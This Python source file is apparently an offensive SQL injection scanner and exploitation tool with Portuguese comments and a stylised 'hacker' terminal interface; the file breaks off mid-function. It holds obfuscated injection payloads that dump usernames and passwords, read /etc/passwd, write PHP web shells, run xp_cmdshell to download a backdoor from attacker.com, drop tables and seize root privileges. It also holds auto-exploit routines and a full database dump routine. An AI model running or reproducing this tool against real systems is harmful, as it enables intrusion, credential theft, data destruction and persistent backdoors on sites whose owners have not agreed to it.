#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import time
import json
import sys
import random
import os
import base64
import binascii
from urllib.parse import urljoin, urlparse, parse_qs, quote
import argparse
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from datetime import datetime
from PIL import Image, ImageDraw, ImageFont
import numpy as np
from pygments import highlight
from pygments.lexers import SqlLexer, JsonLexer
from pygments.formatters import TerminalFormatter
import subprocess
from colorama import init, Fore, Back, Style
import platform
import threading
import simpleaudio as sa
from bs4 import BeautifulSoup
import html

# Inicialização
init(autoreset=True)
os.makedirs("screenshots", exist_ok=True)
os.makedirs("reports", exist_ok=True)
os.makedirs("videos", exist_ok=True)
os.makedirs("sounds", exist_ok=True)
os.makedirs("dumps", exist_ok=True)

# Configuração avançada
class HackerConfig:
    THEMES = {
        'cyberpunk': {
            'primary': Fore.MAGENTA,
            'secondary': Fore.CYAN,
            'alert': Fore.YELLOW,
            'danger': Fore.RED,
            'success': Fore.GREEN
        },
        'dracula': {
            'primary': Fore.BLUE,
            'secondary': Fore.MAGENTA,
            'alert': Fore.YELLOW,
            'danger': Fore.RED,
            'success': Fore.GREEN
        },
        'matrix': {
            'primary': Fore.GREEN,
            'secondary': Fore.WHITE,
            'alert': Fore.YELLOW,
            'danger': Fore.RED,
            'success': Fore.CYAN
        }
    }
    
    SOUNDS = {
        'discover': 'sounds/discover.wav',
        'vulnerable': 'sounds/vulnerable.wav',
        'exploit': 'sounds/exploit.wav',
        'dump': 'sounds/dump.wav',
        'backdoor': 'sounds/backdoor.wav'
    }

# Payloads avançados com técnicas de ofuscação
class PayloadFactory:
    @staticmethod
    def encode_payload(payload):
        """Ofusca payloads usando diferentes técnicas"""
        encodings = [
            lambda x: x,
            lambda x: binascii.hexlify(x.encode()).decode(),
            lambda x: base64.b64encode(x.encode()).decode(),
            lambda x: ''.join([f'CHAR({ord(c)})' for c in x]),
            lambda x: x.replace(" ", "/**/")
        ]
        return random.choice(encodings)(payload)

    @staticmethod
    def get_payloads(db_type=None, risk=1):
        """Retorna payloads categorizados por tipo e risco"""
        base_payloads = {
            'generic': [
                "' OR '1'='1",
                "' OR 1=1--",
                '" OR "1"="1',
                "' OR ''='",
                "' OR 1=1#",
                "' OR 1=1/*",
                "admin'--",
                "admin'#",
                "admin'/*"
            ],
            'data_dump': [
                "' UNION SELECT null,GROUP_CONCAT(table_name),null FROM information_schema.tables WHERE table_schema=database()--",
                "' UNION SELECT null,GROUP_CONCAT(column_name),null FROM information_schema.columns WHERE table_schema=database()--",
                "' UNION SELECT null,GROUP_CONCAT(username,':',password),null FROM users--"
            ],
            'system': [
                "' UNION SELECT null,LOAD_FILE('/etc/passwd'),null--",
                "'; SELECT \"<?php system($_GET['cmd']); ?>\" INTO OUTFILE '/var/www/html/shell.php'--",
                "'; COPY (SELECT '<?php system($_REQUEST['cmd']); ?>') TO '/var/www/html/bd.php'--"
            ],
            'os_command': [
                "'; EXEC xp_cmdshell 'whoami'--",
                "'; EXEC master..xp_cmdshell 'powershell -c \"(New-Object System.Net.WebClient).DownloadFile('http://attacker.com/backdoor.exe','C:\\Windows\\Temp\\backdoor.exe')\"'--",
                "' OR 1=1; DROP TABLE important_data;--"
            ],
            'privilege': [
                "'; GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%' IDENTIFIED BY 'pwned'--",
                "'; ALTER USER 'root'@'localhost' IDENTIFIED BY 'hacked'--",
                "'; UPDATE mysql.user SET Password=PASSWORD('pwned') WHERE User='root'--"
            ]
        }

        # Adicionando payloads específicos por DB
        if db_type == 'MySQL':
            base_payloads['db_specific'] = [
                "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
                "' UNION SELECT null,@@version,null--",
                "' INTO OUTFILE '/tmp/pwned'--",
                "' AND (SELECT LOAD_FILE('/etc/passwd'))--",
                "' UNION SELECT null,table_schema,null FROM information_schema.schemata--"
            ]
        elif db_type == 'MSSQL':
            base_payloads['db_specific'] = [
                "1; EXEC xp_cmdshell 'whoami'--",
                "' UNION SELECT null,name,null FROM master..sysdatabases--",
                "1; DECLARE @x VARCHAR(1024); SET @x=0x77686F616D69; EXEC master..xp_cmdshell @x--",
                "1; SELECT * FROM OPENROWSET('SQLOLEDB', 'Network=DBMSSOCN;Address=your-ip,1433;', 'SELECT * FROM table')--"
            ]
        
        # Filtrar por nível de risco
        payloads = {}
        if risk == 1:  # Baixo risco - apenas detecção
            payloads = {
                'generic': base_payloads['generic'],
                'db_specific': base_payloads.get('db_specific', [])
            }
        elif risk == 2:  # Médio risco - extração de dados
            payloads = {
                'generic': base_payloads['generic'],
                'data_dump': base_payloads['data_dump'],
                'db_specific': base_payloads.get('db_specific', [])
            }
        else:  # Alto risco - execução de comandos
            payloads = base_payloads
        
        # Ofuscar payloads
        for category in payloads:
            payloads[category] = [PayloadFactory.encode_payload(p) for p in payloads[category]]
        
        return payloads

class HackerASCII:
    @staticmethod
    def get_banner(theme, hacker_name=None):
        banners = {
            'default': r"""
    ███████╗ ██████╗ ██╗          ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ 
    ╚══███╔╝██╔═══██╗██║         ██╔═══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
      ███╔╝ ██║   ██║██║         ██║   ██║█████╗  ███████║██████╔╝█████╗  ██████╔╝
     ███╔╝  ██║   ██║██║         ██║   ██║██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
    ███████╗╚██████╔╝███████╗    ╚██████╔╝██║     ██║  ██║██║     ███████╗██║  ██║
    ╚══════╝ ╚═════╝ ╚══════╝     ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
            """,
            'cyberpunk': r"""
    ╔╦╗╔═╗╔╦╗╔═╗╦═╗╔═╗╔╗╔╔═╗╔╦╗    ╔═╗╔═╗╔╦╗╔═╗╦ ╦╔═╗╦═╗
     ║ ║╣ ║║║║╣ ╠╦╝║╣ ║║║║╣  ║     ╠═╝╠═╣║║║║ ║║║║║╣ ╠╦╝
     ╩ ╚═╝╩ ╩╚═╝╩╚═╚═╝╝╚╝╚═╝ ╩     ╩  ╩ ╩╩ ╩╚═╝╚╩╝╚═╝╩╚═
            """,
            'matrix': r"""
    010101010101010101010101010101010101010101010101010101010101010101010101010101
    101010101010101010101010101010101010101010101010101010101010101010101010101010
    010101010101010101010101010101010101010101010101010101010101010101010101010101
    101010101010101010101010101010101010101010101010101010101010101010101010101010
    010101010101010101010101010101010101010101010101010101010101010101010101010101
    101010101010101010101010101010101010101010101010101010101010101010101010101010
    """
        }
        
        if hacker_name:
            banners['personalized'] = f"""
    ░▒▓████████▓▒░ ░▒▓██████▓▒░  ░▒▓█▓▒░       ░▒▓███████▓▒░  ░▒▓████████▓▒░ ░▒▓███████▓▒░  
    ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░       ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░       ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓██████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░       ░▒▓███████▓▒░  ░▒▓██████▓▒░   ░▒▓███████▓▒░  
    ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░       ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░       ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░        ░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓████████▓▒░ ░▒▓██████▓▒░  ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓████████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
    
    {hacker_name.center(80)}
            """
        
        return banners.get(theme, banners['default'])

class HackerTerminal:
    def __init__(self, stealth=False, theme='matrix', sound=False, banner_text=None):
        self.stealth = stealth
        self.theme = theme
        self.sound = sound
        self.banner_text = banner_text
        self.colors = HackerConfig.THEMES.get(theme, HackerConfig.THEMES['matrix'])
        self.status = "ready"
        self.animation_thread = None
        self.stop_animation = False
        
        # Criar arquivos de som padrão se não existirem
        self.create_default_sounds()
        
    def create_default_sounds(self):
        if not os.path.exists("sounds"):
            os.makedirs("sounds")
            
        # Criar sons padrão usando sox (se disponível)
        try:
            if not os.path.exists("sounds/discover.wav"):
                subprocess.run(["sox", "-n", "-r", "44100", "sounds/discover.wav", 
                              "synth", "0.1", "sine", "1000", "vol", "0.5"], check=True)
            if not os.path.exists("sounds/vulnerable.wav"):
                subprocess.run(["sox", "-n", "-r", "44100", "sounds/vulnerable.wav", 
                              "synth", "0.3", "sine", "800:1200", "vol", "0.7"], check=True)
            if not os.path.exists("sounds/exploit.wav"):
                subprocess.run(["sox", "-n", "-r", "44100", "sounds/exploit.wav", 
                              "synth", "0.5", "whitenoise", "vol", "0.3"], check=True)
            if not os.path.exists("sounds/dump.wav"):
                subprocess.run(["sox", "-n", "-r", "44100", "sounds/dump.wav", 
                              "synth", "0.2", "sine", "500:1500", "vol", "0.6"], check=True)
            if not os.path.exists("sounds/backdoor.wav"):
                subprocess.run(["sox", "-n", "-r", "44100", "sounds/backdoor.wav", 
                              "synth", "0.4", "square", "200:800", "vol", "0.5"], check=True)
        except:
            pass
    
    def play_sound(self, sound_type):
        if self.sound and sound_type in HackerConfig.SOUNDS:
            try:
                wave_obj = sa.WaveObject.from_wave_file(HackerConfig.SOUNDS[sound_type])
                wave_obj.play()
            except Exception as e:
                self.print_status(f"Erro ao reproduzir som: {e}", "error")
    
    def typewriter_effect(self, text, delay=0.03):
        for char in text:
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(delay)
        print()
    
    def glitch_text(self, text):
        glitch_chars = ['\u2680', '\u2681', '\u2682', '\u2683', '\u2684', '\u2685']
        result = []
        for char in text:
            if random.random() < 0.1:
                result.append(random.choice(glitch_chars))
            else:
                result.append(char)
        return ''.join(result)
    
    def matrix_animation(self):
        chars = "01"
        width = os.get_terminal_size().columns
        while not self.stop_animation:
            print(''.join(random.choice(chars) for _ in range(width)), end='\r')
            time.sleep(0.05)
    
    def start_animation(self):
        if not self.stealth and self.theme == 'matrix':
            self.stop_animation = False
            self.animation_thread = threading.Thread(target=self.matrix_animation)
            self.animation_thread.start()
    
    def stop_animations(self):
        self.stop_animation = True
        if self.animation_thread:
            self.animation_thread.join()
    
    def print_banner(self):
        if self.stealth:
            return
            
        banner = HackerASCII.get_banner(self.theme, self.banner_text)
        
        print(self.colors['primary'] + banner)
        print("="*80)
        
        menu_items = [
            " [1] Scan completo (SQLi, NoSQL, GraphQL)",
            " [2] Teste de parâmetro específico",
            " [3] Modo avançado (time-based, ORM bypass)",
            " [4] Auto-exploit (se vulnerável)",
            " [5] Dump de banco de dados completo",
            " [6] Criar backdoor persistente",
            " [7] Executar comandos no sistema",
            " [8] Configurações",
            " [9] Sair"
        ]
        
        for item in menu_items:
            self.typewriter_effect(self.colors['secondary'] + item)
        
        print("="*80)
    
    def print_explosion(self):
        explosion = r"""
          _____
         /     \
        | B O O |
         \  M  /
          |===|
          |   |
          |   |
         /     \
        |       |
        |       |
        |       |
         |     |
          |   |
           \_/
        """
        print(self.colors['danger'] + explosion)
    
    def print_status(self, message, status_type="info"):
        color_map = {
            "info": self.colors['secondary'],
            "warning": self.colors['alert'],
            "error": self.colors['danger'],
            "success": self.colors['success']
        }
        
        color = color_map.get(status_type, self.colors['secondary'])
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if status_type == "error":
            message = self.glitch_text(message)
        
        formatted_msg = f"[{timestamp}] {message}"
        if status_type == "success":
            formatted_msg = formatted_msg.upper()
        
        self.typewriter_effect(color + formatted_msg)
        
        if status_type == "success":
            self.play_sound('vulnerable')
            self.print_explosion()
        elif status_type == "error":
            self.play_sound('discover')

class EliteScanner:
    def __init__(self, config):
        self.config = config
        self.terminal = HackerTerminal(
            stealth=config.stealth,
            theme=config.theme,
            sound=config.sound,
            banner_text=config.banner_text
        )
        self.results = []
        self.db_type = None
        self.waf_detected = None
        self.setup_selenium()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': self.get_random_user_agent(),
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
    
    def setup_selenium(self):
        self.chrome_options = Options()
        self.chrome_options.add_argument("--headless")
        self.chrome_options.add_argument("--disable-gpu")
        self.chrome_options.add_argument("--window-size=1920,1080")
        self.chrome_options.add_argument(f"--user-agent={self.get_random_user_agent()}")
        self.chrome_options.add_argument("--ignore-certificate-errors")
        self.chrome_options.add_argument("--disable-web-security")
        self.chrome_options.add_argument("--allow-running-insecure-content")
    
    def get_random_user_agent(self):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
        ]
        return random.choice(user_agents)
    
    def detect_waf(self, response):
        waf_signatures = {
            "Cloudflare": ["cloudflare", "cf-ray"],
            "Akamai": ["akamai", "akamaighost"],
            "Imperva": ["imperva", "incapsula"],
            "AWS WAF": ["aws waf", "aws-waf"],
            "ModSecurity": ["mod_security", "modsecurity"],
            "Barracuda": ["barracuda"],
            "F5 BIG-IP": ["bigip", "f5"],
            "FortiWeb": ["fortiweb"]
        }
        
        headers = str(response.headers).lower()
        content = response.text.lower()
        
        for waf, sigs in waf_signatures.items():
            if any(sig.lower() in headers or sig.lower() in content for sig in sigs):
                return waf
        return None
    
    def detect_db_type(self, response):
        db_signatures = {
            "MySQL": ["mysql", "mariadb"],
            "PostgreSQL": ["postgresql", "postgres"],
            "MSSQL": ["microsoft sql server", "sql server"],
            "Oracle": ["oracle", "ora-"],
            "SQLite": ["sqlite"]
        }
        
        content = response.text.lower()
        error_messages = [
            "sql syntax",
            "syntax error",
            "warning: mysql",
            "unclosed quotation mark",
            "unterminated quoted string"
        ]
        
        if any(msg in content for msg in error_messages):
            for db, sigs in db_signatures.items():
                if any(sig in content for sig in sigs):
                    return db
        
        return None
    
    def take_screenshot(self, url, filename=None):
        try:
            driver = webdriver.Chrome(options=self.chrome_options)
            driver.get(url)
            
            if not filename:
                filename = f"screenshots/screenshot_{int(time.time())}.png"
            else:
                filename = f"screenshots/{filename}"
            
            driver.save_screenshot(filename)
            driver.quit()
            return filename
        except Exception as e:
            self.terminal.print_status(f"Erro ao capturar screenshot: {e}", "error")
            return None
    
    def highlight_vulnerability(self, image_path, payload):
        try:
            img = Image.open(image_path)
            draw = ImageDraw.Draw(img)
            
            # Desenha retângulo vermelho
            draw.rectangle([50, 50, img.width-50, img.height-50], outline="red", width=10)
            
            try:
                # Tenta carregar uma fonte, se não conseguir usa a padrão
                font = ImageFont.truetype("arial.ttf", 30)
            except:
                font = ImageFont.load_default()
            
            # Adiciona texto
            text = f"VULNERABLE TO SQLi: {payload[:50]}..."
            draw.text((100, 100), text, fill="red", font=font)
            
            highlighted_path = image_path.replace(".png", "_highlighted.png")
            img.save(highlighted_path)
            return highlighted_path
        except Exception as e:
            self.terminal.print_status(f"Erro ao destacar vulnerabilidade: {e}", "error")
            return image_path
    
    def record_exploit_video(self, url, payload, output_file):
        try:
            driver = webdriver.Chrome(options=self.chrome_options)
            driver.get(url)
            
            # Grava vídeo usando FFmpeg
            cmd = [
                'ffmpeg',
                '-y',
                '-f', 'x11grab',
                '-video_size', '1920x1080',
                '-i', ':0.0+0,0',
                '-c:v', 'libx264',
                '-preset', 'ultrafast',
                '-qp', '0',
                f'videos/{output_file}'
            ]
            
            proc = subprocess.Popen(cmd)
            
            # Executa o payload
            driver.get(url + payload)
            time.sleep(5)
            
            proc.terminate()
            driver.quit()
            return True
        except Exception as e:
            self.terminal.print_status(f"Erro ao gravar vídeo: {e}", "error")
            return False
    
    def test_sql_injection(self, url, param, value, payloads):
        vulnerabilities = []
        
        for payload in payloads:
            try:
                # Prepara a URL com o payload
                target_url = self.prepare_url(url, param, value + payload)
                
                # Envia a requisição e mede o tempo
                start_time = time.time()
                response = self.session.get(target_url, timeout=30)
                elapsed_time = time.time() - start_time
                
                # Verifica se há WAF
                if not self.waf_detected:
                    self.waf_detected = self.detect_waf(response)
                    if self.waf_detected:
                        self.terminal.print_status(f"WAF Detectado: {self.waf_detected}", "warning")
                
                # Verifica se há vulnerabilidade
                if self.is_vulnerable(response, elapsed_time, payload):
                    # Detecta o tipo de banco de dados se ainda não foi detectado
                    if not self.db_type:
                        self.db_type = self.detect_db_type(response)
                        if self.db_type:
                            self.terminal.print_status(f"Banco de dados detectado: {self.db_type}", "success")
                    
                    # Tira screenshot da página vulnerável
                    screenshot_file = self.take_screenshot(target_url, f"vuln_{param}_{int(time.time())}.png")
                    
                    if screenshot_file:
                        # Destaca a vulnerabilidade na screenshot
                        highlighted_img = self.highlight_vulnerability(screenshot_file, payload)
                        
                        # Adiciona aos resultados
                        vulnerabilities.append({
                            'type': 'SQLi',
                            'param': param,
                            'payload': payload,
                            'response_time': elapsed_time,
                            'status_code': response.status_code,
                            'response_length': len(response.text),
                            'screenshot': highlighted_img,
                            'db_type': self.db_type,
                            'waf': self.waf_detected
                        })
                        
                        self.terminal.print_status(f"Vulnerabilidade encontrada no parâmetro {param} com payload: {payload[:50]}...", "success")
                        
                        # Grava vídeo do exploit se for uma vulnerabilidade crítica
                        if 'UNION' in payload or 'SELECT' in payload:
                            video_file = f"exploit_{param}_{int(time.time())}.mp4"
                            if self.record_exploit_video(url, payload, video_file):
                                vulnerabilities[-1]['video'] = video_file
            except Exception as e:
                self.terminal.print_status(f"Erro ao testar payload {payload[:20]}...: {e}", "error")
                continue
        
        return vulnerabilities
    
    def prepare_url(self, url, param, value):
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        
        # Se o parâmetro já existe na URL, substitui o valor
        if param in query:
            query[param] = [value]
        else:
            # Se não, adiciona o parâmetro
            query[param] = [value]
        
        # Reconstrói a URL
        new_query = []
        for k, v in query.items():
            for val in v:
                new_query.append(f"{k}={quote(val)}")
        
        new_url = parsed._replace(query="&".join(new_query)).geturl()
        return new_url
    
    def is_vulnerable(self, response, elapsed_time, payload):
        # Verifica por erros de sintaxe SQL
        sql_errors = [
            "sql syntax",
            "syntax error",
            "mysql_fetch",
            "unclosed quotation mark",
            "unterminated quoted string",
            "warning: mysql",
            "odbc driver",
            "ora-",
            "postgresql query failed",
            "syntax error or access violation"
        ]
        
        content = response.text.lower()
        if any(error in content for error in sql_errors):
            return True
        
        # Verifica por diferenças de tempo para blind SQLi
        if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
            if elapsed_time > 5:  # Se a resposta demorou mais de 5 segundos
                return True
        
        # Verifica por diferenças no tamanho da resposta
        if 'or 1=1' in payload.lower() or "' or '" in payload.lower():
            original_length = len(self.session.get(response.url.split('?')[0]).text)
            if abs(len(response.text) - original_length) > 100:  # Diferença significativa
                return True
        
        # Verifica por conteúdo específico em UNION-based
        if 'union' in payload.lower():
            if 'sql' not in content and 'error' not in content:  # Resposta sem erros
                return True
        
        return False
    
    def scan_url(self, url):
        self.terminal.print_status(f"Iniciando scan na URL: {url}", "info")
        
        # Obtém os parâmetros da URL
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        
        if not query:
            self.terminal.print_status("Nenhum parâmetro encontrado na URL", "warning")
            return []
        
        vulnerabilities = []
        
        # Obtém payloads genéricos
        payloads = PayloadFactory.get_payloads(risk=self.config.risk)['generic']
        
        # Testa cada parâmetro
        for param in query:
            self.terminal.print_status(f"Testando parâmetro: {param}", "info")
            
            # Obtém o valor original do parâmetro
            original_value = query[param][0]
            
            # Testa os payloads
            vulns = self.test_sql_injection(url, param, original_value, payloads)
            vulnerabilities.extend(vulns)
            
            # Se encontrou vulnerabilidades, testa payloads específicos
            if vulns and self.db_type:
                db_payloads = PayloadFactory.get_payloads(self.db_type, risk=self.config.risk)['db_specific']
                more_vulns = self.test_sql_injection(url, param, original_value, db_payloads)
                vulnerabilities.extend(more_vulns)
        
        # Armazena os resultados para uso posterior
        self.results = vulnerabilities
        return vulnerabilities
    
    def auto_exploit(self, url, param, payload_type):
        self.terminal.print_status("Iniciando auto-exploit...", "warning")
        self.terminal.play_sound('exploit')
        
        if 'UNION' in payload_type:
            return self.exploit_union_based(url, param)
        elif 'time' in payload_type.lower():
            return self.exploit_time_based(url, param)
        else:
            return self.exploit_error_based(url, param)
    
    def exploit_union_based(self, url, param):
        self.terminal.print_status("Executando exploit UNION-based...", "info")
        
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        original_value = query[param][0]
        
        # Primeiro determina o número de colunas
        self.terminal.print_status("Determinando número de colunas...", "info")
        num_columns = 1
        found = False
        
        while num_columns < 15 and not found:
            payload = f"' ORDER BY {num_columns}--"
            target_url = self.prepare_url(url, param, original_value + payload)
            
            try:
                response = self.session.get(target_url)
                if response.status_code == 500:
                    num_columns -= 1
                    found = True
                    break
                num_columns += 1
            except:
                break
        
        if not found:
            self.terminal.print_status("Não foi possível determinar o número de colunas", "error")
            return False
        
        self.terminal.print_status(f"Número de colunas encontrado: {num_columns}", "success")
        
        # Agora encontra as colunas que podem ser exploradas
        self.terminal.print_status("Encontrando colunas textuais...", "info")
        text_columns = []
        
        for i in range(1, num_columns + 1):
            nulls = ["null"] * num_columns
            nulls[i-1] = "'exploitable'"
            payload = f"' UNION SELECT {','.join(nulls)}--"
            
            target_url = self.prepare_url(url, param, original_value + payload)
            response = self.session.get(target_url)
            
            if 'exploitable' in response.text:
                text_columns.append(i)
        
        if not text_columns:
            self.terminal.print_status("Nenhuma coluna textual encontrada", "error")
            return False
        
        self.terminal.print_status(f"Colunas textuais encontradas: {text_columns}", "success")
        
        # Explora as colunas textuais
        exploits = []
        
        if self.db_type == 'MySQL':
            queries = [
                ("Versão do MySQL", "@@version"),
                ("Usuário atual", "user()"),
                ("Banco de dados atual", "database()"),
                ("Lista de tabelas", "concat(table_name) from information_schema.tables where table_schema=database() limit 0,1"),
                ("Lista de colunas", "concat(column_name) from information_schema.columns where table_schema=database() limit 0,1")
            ]
        elif self.db_type == 'MSSQL':
            queries = [
                ("Versão do MSSQL", "@@version"),
                ("Usuário atual", "user_name()"),
                ("Banco de dados atual", "db_name()"),
                ("Lista de tabelas", "top 1 name from sysobjects where xtype='U'"),
                ("Lista de colunas", "top 1 name from syscolumns where id=(select id from sysobjects where name='users')")
            ]
        else:  # Genérico
            queries = [
                ("Versão do banco de dados", "1"),
                ("Usuário atual", "2"),
                ("Banco de dados atual", "3")
            ]
        
        for col in text_columns:
            for name, query in queries:
                nulls = ["null"] * num_columns
                nulls[col-1] = f"({query})"
                payload = f"' UNION SELECT {','.join(nulls)}--"
                
                target_url = self.prepare_url(url, param, original_value + payload)
                response = self.session.get(target_url)
                
                # Extrai os dados da resposta
                soup = BeautifulSoup(response.text, 'html.parser')
                text = soup.get_text()
                
                exploits.append({
                    'type': 'UNION',
                    'column': col,
                    'query': name,
                    'payload': payload,
                    'data': text[:500]  # Limita a 500 caracteres
                })
                
                self.terminal.print_status(f"Dados extraídos ({name}): {text[:100]}...", "success")
        
        return exploits
    
    def exploit_time_based(self, url, param):
        self.terminal.print_status("Executando exploit time-based...", "info")
        
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        original_value = query[param][0]
        
        exploits = []
        
        if self.db_type == 'MySQL':
            queries = [
                ("Versão do MySQL", "if(ascii(substring(@@version,1,1))>0,sleep(5),0)"),
                ("Usuário atual", "if(ascii(substring(user(),1,1))>0,sleep(5),0)"),
                ("Banco de dados atual", "if(ascii(substring(database(),1,1))>0,sleep(5),0)")
            ]
        elif self.db_type == 'MSSQL':
            queries = [
                ("Versão do MSSQL", "if(ascii(substring(@@version,1,1))>0 waitfor delay '0:0:5',0)"),
                ("Usuário atual", "if(ascii(substring(user_name(),1,1))>0 waitfor delay '0:0:5',0)"),
                ("Banco de dados atual", "if(ascii(substring(db_name(),1,1))>0 waitfor delay '0:0:5',0)")
            ]
        else:  # Genérico
            queries = [
                ("Teste de delay", "1=if(1=1,sleep(5),0)")
            ]
        
        for name, query in queries:
            payload = f"' AND {query}--"
            target_url = self.prepare_url(url, param, original_value + payload)
            
            start_time = time.time()
            try:
                response = self.session.get(target_url, timeout=10)
                elapsed_time = time.time() - start_time
                
                if elapsed_time > 5:
                    exploits.append({
                        'type': 'TIME',
                        'query': name,
                        'payload': payload,
                        'response_time': elapsed_time
                    })
                    self.terminal.print_status(f"Vulnerabilidade time-based confirmada: {name}", "success")
                else:
                    self.terminal.print_status(f"Teste negativo para: {name}", "warning")
            except:
                exploits.append({
                    'type': 'TIME',
                    'query': name,
                    'payload': payload,
                    'response_time': 'timeout'
                })
                self.terminal.print_status(f"Timeout confirmando vulnerabilidade: {name}", "success")
        
        return exploits
    
    def exploit_error_based(self, url, param):
        self.terminal.print_status("Executando exploit error-based...", "info")
        
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        original_value = query[param][0]
        
        exploits = []
        
        if self.db_type == 'MySQL':
            queries = [
                ("Versão do MySQL", "extractvalue(1,concat(0x5c,@@version))"),
                ("Usuário atual", "extractvalue(1,concat(0x5c,user()))"),
                ("Banco de dados atual", "extractvalue(1,concat(0x5c,database()))")
            ]
        elif self.db_type == 'MSSQL':
            queries = [
                ("Versão do MSSQL", "convert(int,@@version)"),
                ("Usuário atual", "convert(int,user_name())"),
                ("Banco de dados atual", "convert(int,db_name())")
            ]
        else:  # Genérico
            queries = [
                ("Teste de erro", "1=convert(int,@@version)")
            ]
        
        for name, query in queries:
            payload = f"' AND {query}--"
            target_url = self.prepare_url(url, param, original_value + payload)
            
            try:
                response = self.session.get(target_url)
                
                if "error" in response.text.lower() or "exception" in response.text.lower():
                    exploits.append({
                        'type': 'ERROR',
                        'query': name,
                        'payload': payload,
                        'error': response.text[:500]  # Limita a 500 caracteres
                    })
                    self.terminal.print_status(f"Vulnerabilidade error-based confirmada: {name}", "success")
                else:
                    self.terminal.print_status(f"Teste negativo para: {name}", "warning")
            except Exception as e:
                self.terminal.print_status(f"Erro ao testar exploit: {e}", "error")
        
        return exploits
    
    def dump_database(self, url, param):
        """Extrai todo o conteúdo do banco de dados"""
        self.terminal.print_status("Iniciando dump completo do banco de dados...", "warning")
        self.terminal.play_sound('dump')
        
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        original_value = query[param][0]
        
        if not self.db_type:
            self.terminal.print_status("Tipo de banco de dados desconhecido. Execute um scan primeiro.", "error")
            return None
        
        # Primeiro obtém todas as tabelas
        if self.db_type == 'MySQL':
            payload = f"' UNION SELECT null,GROUP_CONCAT(table_name),null FROM information_schema.tables WHERE table_schema=database()--"
        elif self.db_type == 'MSSQL':
            payload = f"' UNION SELECT null,name,null FROM sysobjects WHERE xtype='U'--"
        else:
            self.terminal.print_status(f"Dump automático não suportado para {self.db_type}", "error")
            return None
        
        target_url = self.prepare_url(url, param, original_value + payload)
        response = self.session.get(target_url)
        
        # Extrai os nomes das tabelas
        soup = BeautifulSoup(response.text, 'html.parser')
        tables_text = soup.get_text()
        tables = [t.strip() for t in tables_text.split(',') if t.strip()]
        
        if not tables:
            self.terminal.print_status("Nenhuma tabela encontrada no banco de dados", "error")
            return None
        
        self.terminal.print_status(f"Tabelas encontradas: {', '.join(tables)}", "success")
        
        # Agora extrai os dados de cada tabela
        database_dump = {}
        
        for table in tables:
            self.terminal.print_status(f"Extraindo dados da tabela: {table}", "info")
            
            if self.db_type == 'MySQL':
                # Primeiro obtém as colunas
                columns_payload = f"' UNION SELECT null,GROUP_CONCAT(column_name),null FROM information_schema.columns WHERE table_name='{table}' AND table_schema=database()--"
                target_url = self.prepare_url(url, param, original_value + columns_payload)
                response = self.session.get(target_url)
                soup = BeautifulSoup(response.text, 'html.parser')
                columns_text = soup.get_text()
                columns = [c.strip() for c in columns_text.split(',') if c.strip()]
                
                if not columns:
                    continue
                
                # Agora extrai os dados
                data_payload = f"' UNION SELECT null,GROUP_CONCAT(CONCAT_WS('|', {','.join(columns)})),null FROM {table}--"
            elif self.db_type == 'MSSQL':
                # Primeiro obtém as colunas
                columns_payload = f"' UNION SELECT null,name,null FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='{table}')--"
                target_url = self.prepare_url(url, param, original_value + columns_payload)
                response = self.session.get(target_url)
                soup = BeautifulSoup(response.text, 'html.parser')
                columns = [c.strip() for c in response.text.split('\n') if c.strip()]
                
                if not columns:
                    continue
                
                # Agora extrai os dados
                data_payload = f"' UNION SELECT null,{columns[0]},null FROM {table}--"
            
            target_url = self.prepare_url(url, param, original_value + data_payload)
            response = self.session.get(target_url)
